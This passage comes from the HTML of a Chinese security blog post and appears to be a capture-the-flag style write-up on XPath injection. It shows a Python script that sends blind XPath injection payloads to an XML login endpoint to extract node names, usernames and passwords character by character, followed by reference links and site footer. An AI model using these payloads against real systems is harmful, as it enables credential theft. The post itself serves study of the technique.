1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        payload_4 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        payload_password =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_password)</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload_username)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;非法操作&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;用户名或密码错误!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<blockquote>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7791">https://xz.aliyun.com/t/7791</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8554749.html">https://www.cnblogs.com/backlion/p/8554749.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/338732.html">https://www.freebuf.com/articles/web/338732.html</a></p>
+</blockquote>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/20/XSSbypass/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>XSS bypass</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/14/SSRFbypass/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      SSRF bypass
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
